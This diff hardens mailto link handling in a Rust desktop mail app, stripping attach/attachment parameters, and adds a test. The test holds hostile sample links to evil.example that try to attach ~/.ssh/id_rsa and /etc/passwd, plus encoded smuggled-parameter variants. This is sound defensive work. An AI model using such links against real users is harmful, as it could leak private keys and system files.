@@ -343,11 +343,81 @@ fn popup(app: &tauri::AppHandle, shared: &Shared, url: &Url) {
         return;
     }
     let _ = shared;
-    if matches!(url.scheme(), "http" | "https" | "mailto")
-        && let Err(e) = app.opener().open_url(url.as_str(), None::<&str>)
+    let target = match url.scheme() {
+        "http" | "https" => Some(url.to_string()),
+        "mailto" => plain_mailto(url),
+        _ => None,
+    };
+    if let Some(target) = target
+        && let Err(e) = app.opener().open_url(&target, None::<&str>)
     {
-        eprintln!("tmpmail-gui: could not open {url}: {e}");
+        eprintln!("tmpmail-gui: could not open {target}: {e}");
     }
+}
+
+/// A `mailto:` link rebuilt from its address, `to`, `subject` and `body`
+/// only. The rest (`attach=`, `attachment=`, `cc`...) goes: mail clients
+/// that honored `attach` prefilled a file from the user's disk. Values are
+/// read as RFC 6068 has them (`+` is a plus) and written percent-encoded;
+/// an address that decodes to `?`, `&`, `#`, a space or a control character
+/// (which could start parameters again in a client that decodes first)
+/// isn't opened.
+fn plain_mailto(url: &Url) -> Option<String> {
+    let decode = |s: &str| {
+        let b = s.as_bytes();
+        let (mut out, mut i) = (Vec::with_capacity(b.len()), 0);
+        while i < b.len() {
+            let hex = |c: u8| (c as char).to_digit(16);
+            match (
+                b[i],
+                b.get(i + 1).and_then(|&c| hex(c)),
+                b.get(i + 2).and_then(|&c| hex(c)),
+            ) {
+                (b'%', Some(h), Some(l)) => {
+                    out.push((h * 16 + l) as u8);
+                    i += 3;
+                }
+                (c, ..) => {
+                    out.push(c);
+                    i += 1;
+                }
+            }
+        }
+        String::from_utf8_lossy(&out).into_owned()
+    };
+    let bad_address = |a: &str| {
+        a.chars()
+            .any(|c| c.is_whitespace() || c.is_control() || matches!(c, '?' | '&' | '#'))
+    };
+    let address = decode(url.path());
+    if bad_address(&address) {
+        return None;
+    }
+    let mut parts = Vec::new();
+    for pair in url.query().unwrap_or_default().split('&') {
+        let (k, v) = pair.split_once('=').unwrap_or((pair, ""));
+        let k = k.to_ascii_lowercase();
+        let v = decode(v);
+        match k.as_str() {
+            "to" if bad_address(&v) => return None,
+            "to" | "subject" | "body" => {
+                parts.push(format!("{k}={}", tmpmail::render::percent_encode(&v)))
+            }
+            _ => {}
+        }
+    }
+    if address.is_empty() && !parts.iter().any(|p| p.starts_with("to=")) {
+        return None;
+    }
+    let mut out = format!(
+        "mailto:{}",
+        tmpmail::render::percent_encode(&address).replace("%40", "@")
+    );
+    if !parts.is_empty() {
+        out.push('?');
+        out.push_str(&parts.join("&"));
+    }
+    Some(out)
 }
 
 fn main() {
@@ -381,6 +451,10 @@ fn main() {
     #[cfg(not(windows))]
     let pending: Option<notify::Target> = None;
     let start_hidden = gui.start_minimized && pending.is_none();
+    // Drag files a crashed earlier run left behind, off the main thread.
+    if drag::SUPPORTED && !probing {
+        std::thread::spawn(|| drag::clean_leftovers(&std::env::temp_dir()));
+    }
     let shared = Arc::new(Shared {
         worker: OnceLock::new(),
         start_error: OnceLock::new(),
@@ -638,6 +712,30 @@ mod tests {
                 "https://example.com/a"
             ]
         );
+    }
+
+    #[test]
+    fn mailto_links_keep_only_the_address_subject_and_body() {
+        // Security review C4.
+        let open = |u: &str| plain_mailto(&Url::parse(u).unwrap());
+        assert_eq!(
+            open("mailto:x@evil.example?attach=~/.ssh/id_rsa&subject=Hi%20there&Attachment=/etc/passwd&body=1+1&cc=c@d")
+                .as_deref(),
+            Some("mailto:x@evil.example?subject=Hi%20there&body=1%2B1")
+        );
+        assert_eq!(
+            open("mailto:a@b.example").as_deref(),
+            Some("mailto:a@b.example")
+        );
+        assert_eq!(
+            open("mailto:?to=unsub@list.example&subject=unsubscribe").as_deref(),
+            Some("mailto:?to=unsub%40list.example&subject=unsubscribe")
+        );
+        assert!(open("mailto:").is_none());
+        // Parameters smuggled in the address, encoded.
+        assert!(open("mailto:x@evil.example%3Fattach=/home/u/.ssh/id_rsa").is_none());
+        assert!(open("mailto:x@evil.example%0Aattach=x").is_none());
+        assert!(open("mailto:?to=a@b%26attach=x").is_none());
     }
 
     #[test]
